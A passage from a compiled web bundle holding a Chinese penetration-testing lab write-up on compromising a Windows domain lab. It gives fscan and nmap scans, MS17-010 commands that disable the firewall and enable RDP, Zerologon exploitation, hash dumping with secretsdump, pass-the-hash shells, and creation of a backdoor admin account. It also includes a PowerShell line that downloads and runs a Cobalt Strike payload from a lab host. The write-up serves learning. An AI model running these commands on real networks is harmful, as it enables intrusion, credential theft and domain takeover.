open\r\n192.168.52.141:7001 open\r\n192.168.52.141:135 open\r\n192.168.52.141:445 open\r\n192.168.52.141:139 open\r\n192.168.52.141:21 open\r\n[*] alive ports len is: 8\r\nstart vulscan\r\n[*] NetInfo \r\n[*]192.168.52.141\r\n   [->]root-tvi862ubeh\r\n   [->]192.168.52.141\r\n[+] MS17-010 192.168.52.141     (Windows Server 2003 3790)\r\n[*] WebTitle http://192.168.52.141:8099 code:403 len:1409   title:The page must be viewed over a secure channel\r\n[*] WebTitle https://192.168.52.141:8098 code:401 len:1656   title:You are not authorized to view this page\r\n[*] WebTitle http://192.168.52.141:7002 code:200 len:2632   title:Sentinel Keys License Monitor\r\n\u5df2\u5b8c\u6210 8/8\r\n[*] \u626b\u63cf\u7ed3\u675f,\u8017\u65f6: 1m44.720118419s\n"})}),"\n",(0,i.jsx)(e.h4,{id:"nmap\u626b\u63cf",children:"nmap\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~]\r\n\u2514\u2500# proxychains4 nmap -Pn -T4 -sT -p80,135,445,3389 192.168.52.138\r\n[proxychains] config file found: /etc/proxychains4.conf\r\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\r\n[proxychains] DLL init: proxychains-ng 4.16\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-03 11:35 EDT\r\n[proxychains] Strict chain  ...  192.168.170.91:1234  ...  192.168.52.138:3389 <--socket error or timeout!\r\n[proxychains] Strict chain  ...  192.168.170.91:1234  ...  192.168.52.138:445  ...  OK\r\nRTTVAR has grown to over 2.3 seconds, decreasing to 2.0\r\nRTTVAR has grown to over 2.3 seconds, decreasing to 2.0\r\n[proxychains] Strict chain  ...  192.168.170.91:1234  ...  192.168.52.138:135  ...  OK\r\nRTTVAR has grown to over 2.3 seconds, decreasing to 2.0\r\nRTTVAR has grown to over 2.3 seconds, decreasing to 2.0\r\n[proxychains] Strict chain  ...  192.168.170.91:1234  ...  192.168.52.138:80  ...  OK\r\nRTTVAR has grown to over 2.3 seconds, decreasing to 2.0\r\nRTTVAR has grown to over 2.3 seconds, decreasing to 2.0\r\nNmap scan report for bogon (192.168.52.138)\r\nHost is up (10s latency).\r\n\r\nPORT     STATE  SERVICE\r\n80/tcp   open   http\r\n135/tcp  open   msrpc\r\n445/tcp  open   microsoft-ds\r\n3389/tcp closed ms-wbt-server\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~]\r\n\u2514\u2500# proxychains4 nmap -Pn -T4 -sT -p80,135,445,3389 192.168.52.141\r\n[proxychains] config file found: /etc/proxychains4.conf\r\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\r\n[proxychains] DLL init: proxychains-ng 4.16\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-03 11:36 EDT\r\n[proxychains] Strict chain  ...  192.168.170.91:1234  ...  192.168.52.141:135  ...  OK\r\n[proxychains] Strict chain  ...  192.168.170.91:1234  ...  192.168.52.141:445  ...  OK\r\n[proxychains] Strict chain  ...  192.168.170.91:1234  ...  192.168.52.141:80 <--socket error or timeout!\r\n[proxychains] Strict chain  ...  192.168.170.91:1234  ...  192.168.52.141:3389  ...  OK\r\nNmap scan report for bogon (192.168.52.141)\r\nHost is up (0.12s latency).\r\n\r\nPORT     STATE  SERVICE\r\n80/tcp   closed http\r\n135/tcp  open   msrpc\r\n445/tcp  open   microsoft-ds\r\n3389/tcp open   ms-wbt-server\n"})}),"\n",(0,i.jsx)(e.h4,{id:"\u6253ms17-010",children:"\u6253MS17-010"}),"\n",(0,i.jsxs)(e.p,{children:["\u7136\u540e\u5229\u7528",(0,i.jsx)(e.code,{children:"msf"}),"\u6253",(0,i.jsx)(e.code,{children:"MS17-010"}),"\u6f0f\u6d1e"]}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'}),"\u5f00\u542f3389\u8fdc\u7a0b\u684c\u9762"]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f'}),"\u5173\u95ed3389\u8fdc\u7a0b\u684c\u9762"]}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"search ms17\r\nuse auxiliary/admin/smb/ms17_010_command\r\nset RHOSTS 192.168.52.141\r\nset command 'netsh advfirewall set allprofiles state off'\r\nexploit\r\nset command 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'\r\nexploit\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u8fdc\u7a0b\u63a7\u5236",(0,i.jsx)(e.code,{children:"Windows Server 2003"})]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"proxychains4 rdesktop 192.168.52.141 -p dabaisec@2024 -u Administrator\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240504212054404.png",alt:"image-20240504212054404"})}),"\n",(0,i.jsxs)(e.p,{children:["\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u6253\u4e0d\u901a\u57df\u63a7\u8fd9\u53f0\u4e3b\u673a\uff0c\u6211\u4eec\u5c31\u7528",(0,i.jsx)(e.code,{children:"CVE-2020-1472"}),"\u5c06\u57df\u63a7\u7684\u5bc6\u7801\u7f6e\u7a7a"]}),"\n",(0,i.jsx)(e.h4,{id:"cve-2020-1472\u7684\u5229\u7528",children:"CVE-2020-1472\u7684\u5229\u7528"}),"\n",(0,i.jsx)(e.p,{children:"\u9996\u5148\u6d4b\u8bd5\u4e00\u4e0b\u57df\u63a7\u662f\u5426\u6709\u8fd9\u4e2a\u6f0f\u6d1e"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"proxychains4 python3 zerologon_tester.py owa 192.168.52.138\r\n\r\nSuccess! DC can be fully compromised by a Zerologon attack.\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd4\u56de\u6210\u529f\uff0c\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[/home/kali/hongri1/CVE-2020-1472-master]\r\n\u2514\u2500# proxychains4 python3 cve-2020-1472-exploit.py owa 192.168.52.138\r\n\r\nTarget vulnerable, changing account password to empty string\r\n\r\nResult: 0\r\nExploit complete!\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u91cd\u7f6e\u6210\u529f\uff0c\u5229\u7528",(0,i.jsx)(e.code,{children:"Dcsync"}),"\u67e5\u770b\u5bc6\u7801hash"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"proxychains4 impacket-secretsdump 'god.org/owa$@192.168.52.138' -no-pass\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u5f97\u5230",(0,i.jsx)(e.code,{children:"Administrator"}),"\u7684\u5bc6\u7801hash"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"Administrator:500:aad3b435b51404eeaad3b435b51404ee:6a2ff5138ef3012467338a175e14f440:::\n"})}),"\n",(0,i.jsx)(e.h5,{id:"\u5229\u7528wmiexec\u83b7\u53d6\u5230shell",children:"\u5229\u7528wmiexec\u83b7\u53d6\u5230Shell"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"proxychains4 impacket-wmiexec 'administrator@192.168.52.138' -hashes aad3b435b51404eeaad3b435b51404ee:6a2ff5138ef3012467338a175e14f440\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240504214615718.png",alt:"image-20240504214615718"})}),"\n",(0,i.jsx)(e.p,{children:"\u6dfb\u52a0\u4e00\u4e2a\u7528\u6237\uff0c\u7528\u4e8e\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-cmd",children:"net user test123 Password123 /add /domain\r\nnet localgroup administrators test123 /add\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240504220556947.png",alt:"image-20240504220556947"})}),"\n",(0,i.jsx)(e.p,{children:"\u81f3\u6b64\u4e09\u53f0\u4e3b\u673a\u5168\u90e8\u62ff\u4e0b"}),"\n",(0,i.jsx)(e.h5,{id:"\u5bc6\u7801\u590d\u539f\u64cd\u4f5c",children:"\u5bc6\u7801\u590d\u539f\u64cd\u4f5c"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u5c06\u57df\u63a7\u7684\u5bc6\u7801\u7f6e\u7a7a\u4e86\uff0c\u5fc5\u987b\u6062\u590d\u4e00\u4e0b\uff0c\u5426\u5219\u53ef\u80fd\u8131\u57df\u5bfc\u81f4\u6574\u4e2a\u57df\u73af\u5883\u762b\u75ea"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u5907\u4efd\u6ce8\u518c\u8868"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-cmd",children:"reg save HKLM\\SYSTEM system.save\r\nreg save HKLM\\SAM sam.save\r\nreg save HKLM\\SECURITY security.save\r\nget system.save\r\nget sam.save\r\nget security.save\r\ndel /f system.save\r\ndel /f sam.save\r\ndel /f security.save\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u4e0b\u8f7d\u5230kali\u4e0a"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240504215256573.png",alt:"image-20240504215256573"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"$MACHINE.ACC\u540e\u534a\u90e8\u5206\u7684\u503c\r\n4dc34830e6970e81a66b5e8d9ff3ac9f\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"proxychains4 python3 reinstall_original_pw.py owa 192.168.52.138 4dc34830e6970e81a66b5e8d9ff3ac9f\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240504215643844.png",alt:"image-20240504215643844"})}),"\n",(0,i.jsx)(e.p,{children:"\u6062\u590d\u6210\u529f"}),"\n",(0,i.jsx)(e.h3,{id:"cs\u901f\u901a",children:"CS\u901f\u901a"}),"\n",(0,i.jsxs)(e.p,{children:["\u5c1d\u8bd5\u76f4\u63a5\u7528\u8681\u5251\u7684\u865a\u62df\u7ec8\u7aef\u8fdb\u884c",(0,i.jsx)(e.code,{children:"web\u6295\u9012"}),",\u53d1\u73b0\u4e0d\u80fd\u6210\u529f"]}),"\n",(0,i.jsxs)(e.p,{children:["\u4f7f\u7528MSF\u62ff\u5230\u4e00\u4e2a",(0,i.jsx)(e.code,{children:"shell"}),"\uff0c\u53d1\u73b0web\u6295\u9012\u53ef\u4ee5\u4e0a\u7ebf"]}),"\n",(0,i.jsx)(e.h4,{id:"web\u6295\u9012",children:"web\u6295\u9012"}),"\n",(0,i.jsx)(e.p,{children:"\u9996\u5148\u751f\u6210web\u6295\u9012\u4ee3\u7801"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240506203651450.png",alt:"image-20240506203651450"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.170.91:80/a'))\"\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240506204015004.png",alt:"image-20240506204015004"})}),"\n",(0,i.jsxs)(e.p,{children:["\u6210\u529f\u4e0a\u7ebf\u540e\uff0c\u8fdb\u884c\u6293\u5bc6\u7801\u54c8\u5e0c\uff0c",(0,i.jsx)(e.strong,{children:"\u7f51\u7edc\u63a2\u6d4b"})]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240506204222557.png",alt:"image-20240506204222557"})}),"\n",(0,i.jsx)(e.h4,{id:"\u6a2a\u5411\u79fb\u52a8-1",children:"\u6a2a\u5411\u79fb\u52a8"}),"\n",(0,i.jsxs)(e.p,{children:["\u7136\u540e\u5c31\u662f\u5229\u7528",(0,i.jsx)(e.strong,{children:"\u57df\u7ba1\u7406\u5458"}),"\u6743\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240506205445722.png",alt:"image-20240506205445722"})}),"\n",(0,i.jsx)(e.p,{children:"\u4e0a\u7ebf\u4e09\u53f0\u4e3b\u673a\uff0c\u7ed3\u675f"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240506205209979.png",alt:"image-20240506205209979"})}),"\n",(0,i.jsx)(e.h3,{id:"\u603b\u7ed3",children:"\u603b\u7ed3"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"1.mysql\u53ef\u4ee5\u5229\u7528\u65e5\u5fd7\u5199shell\uff0c\u5f00\u542f\u65e5\u5fd7\uff0c\u8bbe\u7f6e\u65e5\u5fd7\u6587\u4ef6\uff0c\u67e5\u8be2\u8bb0\u5f55\u5199\u5165shell"}),"\n",(0,i.jsxs)(e.p,{children:["2.\u719f\u6089\u4e86MSF\u7684\u57fa\u672c\u4f7f\u7528\uff0c\u5982",(0,i.jsx)(e.code,{children:"migrate"}),"\u8fc1\u79fb\u8fdb\u7a0b\uff0c",(0,i.jsx)(e.code,{children:"kiwi"}),"\u8fdb\u884c\u6293\u5bc6\u7801hash"]}),"\n",(0,i.jsxs)(e.p,{children:["3.\u4e86\u89e3\u4e86\u5229\u7528",(0,i.jsx)(e.code,{children:"frp"}),"\u5de5\u5177\u642d\u5efa",(0,i.jsx)(e.code,{children:"socks"}),"\u96a7\u9053\uff0c",(0,i.jsx)(e.code,{children:"impacket"}),"\u5de5\u5177\u7b80\u5355\u4f7f\u7528"]}),"\n",(0,i.jsxs)(e.p,{children:["4.\u5bf9",(0,i.jsx)(e.code,{children:"MS17-010"}),"\u548c",(0,i.jsx)(e.code,{children:"CVE-2020-1472"}),"\u6709\u7b80\u5355\u7684\u8ba4\u8bc6"]}),"\n",(0,i.jsx)(e.p,{children:"5.\u4f7f\u7528CS\u7684\u4e00\u4e9b\u529f\u80fd\uff0cCS\u8fd9\u4e2a\u5de5\u5177\u8fd8\u662f\u5f88\u5f3a\u5927\u7684"}),"\n",(0,i.jsx)(e.p,{children:"6.\u521d\u89c1\u5185\u7f51\uff0c\u611f\u89c9\u5185\u7f51\u8fd8\u662f\u5f88\u96be\u7684\uff0c\u6162\u6162\u5b66\u5427"}),"\n"]}),"\n",(0,i.jsx)(e.h3,{id:"\u53c2\u8003\u94fe\u63a5",children:"\u53c2\u8003\u94fe\u63a5"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.a,{href:"https://developer.aliyun.com/article/1338619",children:"MySQL\u5199Shell\u65b9\u6cd5\u603b\u7ed3"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.a,{href:"https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20201472.html",children:"CVE-2020-1472\u6f0f\u6d1e\u590d\u73b0"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.a,{href:"https://blog.csdn.net/weixin_54902210/article/details/128340400",children:"[\u5185\u7f51\u6e17\u900f]\u2014NetLogon \u57df\u5185\u63d0\u6743\u6f0f\u6d1e(CVE-2020-1472)"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.a,{href:"https://github.com/risksense/zerologon",children:"ZeroLogon exploitation script"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.a,{href:"https://blog.csdn.net/qq_45455136/article/details/125820952",children:"\u57df\u5185\u57fa\u7840\u4fe1\u606f\u6536\u96c6"})})]})}function h(n={}){const{wrapper:e}={...(0,c.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(o,{...n})}):o(n)}}}]);